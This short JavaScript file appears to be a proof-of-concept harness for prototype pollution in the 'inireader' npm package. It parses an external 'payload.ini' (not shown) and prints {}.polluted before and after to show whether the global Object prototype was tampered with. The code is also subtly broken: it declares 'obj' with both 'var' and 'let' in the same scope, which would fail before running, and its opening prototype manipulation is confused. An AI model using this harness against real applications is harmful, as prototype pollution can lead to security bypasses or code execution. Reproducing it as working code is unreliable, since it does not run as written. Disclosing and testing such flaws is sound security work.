var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
const iniReader = require('inireader');
const path = require('path');
const parser = new iniReader.IniReader();
let obj = {};
console.log({}.polluted);
parser.load(path.resolve(__dirname, './payload.ini'));
console.log({}.polluted);